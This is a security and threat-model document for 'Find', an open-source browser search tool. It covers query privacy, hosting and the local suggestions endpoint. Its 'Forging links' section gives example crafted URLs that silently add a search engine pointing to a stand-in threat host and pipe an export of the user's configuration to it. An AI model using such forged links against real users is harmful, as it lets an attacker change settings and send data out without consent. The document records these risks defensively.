# Security
This document should (tries to) describe the security model followed
by Find; what should make it privacy friendly, how a user query is
kept private, and only shared with the destination site.

## Contact
Please get in touch over the matrix chat if you have any security
concerns.

## Disclaimer(s)
Naturally, one needs to trust all the destinations site in the list,
and the people choosing them.

There is the possibility that a user "misstypes a search", calling "an
other engine and symbol than expected"; which will result in sharing
the query with the destination URL.

I don't think this is a security risk, but a concern to be sure "what
we're typing", and what it is doing (also what is the sensitivity of
the user query).

> Also, there lack tests.

## Model
Listing the different areas encompassed by the threat modeling.

> If some areas are missing, we need to implement them.

### Software
- the software is open and free, and can be customized by the users
- logic implemented in a single "small" vanilla javascript file
- the UI is implemented in more files (loaded if the query does not
  result in a URL to open)
- there is no "build step" to execute the code
- there are no dependencies at build and run time (but a web-browser)
- does not store or share user data (other than the user
  customization, if any)
- allows export and import of the user configuration as JSON data

### Infrastructure
- the software is shared on git://github.com/internet4000/find.git
- the demo/"main" instance is hosted on github pages
- the pages are deployed from an action "recipe" workflow
- serveral recipes are shared for user to deploy their own instance
- new github tags deploy a new version of the package to the public
  npm registry (matches the `package.json.version` number)
- user can and are invited to run their own instance
- running a personal instance should be made accessible, maybe 1-click

It should be possible to:
- distribute the code from a (machine) local server or a
  personal server behind a VPN
- make it a browser extension to have the code separated from "the
  real internet", if a user wants
- distribute the code on a "random" or tempory URL, such as an embed
  javascript bookmarklet or a "decentralized storage"

### Distribution
As Javasript (Class, web-components, node.js scripts), HTML, CSS
code:
- main instance demo site https://internet4000.github.io/find
- npm package https://www.npmjs.com/package/i4k-find
- git repository https://github.com/internet4000/find

### Query to Find
- is never shared to other sites or third parties
- is typed in the browser URL address-bar/omnibox, and passed to Find
  if it does not resolve in a "pattern" (URI, reserved keywords), that
  the browser "knows" (`view-source:`, `javascript:`, `https://**`,
  `ftp://` etc.)
- is passed to Find, if it is registered as a _browser protocol
  handler_ (not yet supported)
- is passed to Find, if it is used on an "instance" site, through the
  interface elements (search input, query builder button etc.)
- is passed to Find if it is called as a Javascript module with
  functions
- is passed to find through the URL hash `#` parameter `#q=`, and
  should therefore not be shared with the server hosting Find's code
- can be passed to the search `?` search parameter if the user uses it
  (which is shared to the server, to be acknownledged when using)
- is "read by find" to build a destination URL (or an other Find
  query), and "transformed" by replacing the user patterns
- is shared with a local API endpoint

### Request from Find
How Find uses the resulting URL from a Find query.

#### Query resolving
- Find replaces the current browser page's URL, by the URL that was
  resolved from a user query
- the user query is embeded in this website URL, following the URL
  pattern for the "symbol and engine" that were requested
- resolves in a URI/URL or Find query (interpreted again), and Find
   opens a new browser URL, expected if asked not to in
   `Find(query<String>, open<Boolean>)`
- can result in a `https:` URL proxying other protocol(s) `gopher:`
- can result in a `https:` proxy being used to display, as text,
  unsupported for opening as URL, but usefull, protocols; such as
  `data:<type>` to share data

#### Local API endpoint
> Currently not working when called from a browser URL box, only from
> the the Find UI.

- the `/api/suggestions#q=%s` local endpoint, is built in a
  `service-worker.js` file, served with the site, executed locally
- it is used if a user uses the search UI element(s)
- ff a user has browser search/URL typing suggestions enabled, the
browser shares by default the typing suggestions (each character
change) to the OpenSearch.xml suggestions endpoint
- the Find OpenSearch description, specifies the `#` param for user
  queries to be passed as the `%s` OpenSearch Placeholder
- currently no data is queried externaly from Find by its suggestion
  system (but exploring how to "forward the sugggestions" if a
  destination URL has support for them in their OpenSearch.xml)
- suggestions only consist of Find existing symbols engines (but could
  soon contain "community packages suggestions"; @TODO:beware of user
  generated content when in place)

## Forging links
Malicious actors could be forging links, that a Find user could click.

```txt
https://internet4000.github.io/#q=hello

;; encodeURI('https://internet4000.github.io/#q=<find query>')

https://internet4000.github.io/#& internet4000 find
"https://internet4000.github.io/#&%20internet4000%20find"

https://internet4000.github.io/#q=#add ! d https://test.org/threat/?q={}
https://internet4000.github.io/#q=#add%20!%20d%20https://test.org/threat/?q=%7B%7D"

;; Or more generally if "pipes" and recursive Find come in
#export | <destination_URL>
#export | https://test.org/threat/?q=
;; which would look like
https://internet4000.github.io/#q=#export | https://test.org/threat/?q=
https://internet4000.github.io/#q=#export%20%7C%20https://test.org/threat/?q=
```

We should enforce methods so it does not lead to an unwanted action,
such as changing the user configuration, executing aribtrary code,
opening destination, or transiant URLs, not explicitely aknowledged by
a user.

There was a `window.confirm()` call before executing a `#` command
call, but was removed. Maybe this should be enforced again, for this
and other scenarios.

## Notes
Get in touch for any concern, or contribution; this is experimental.
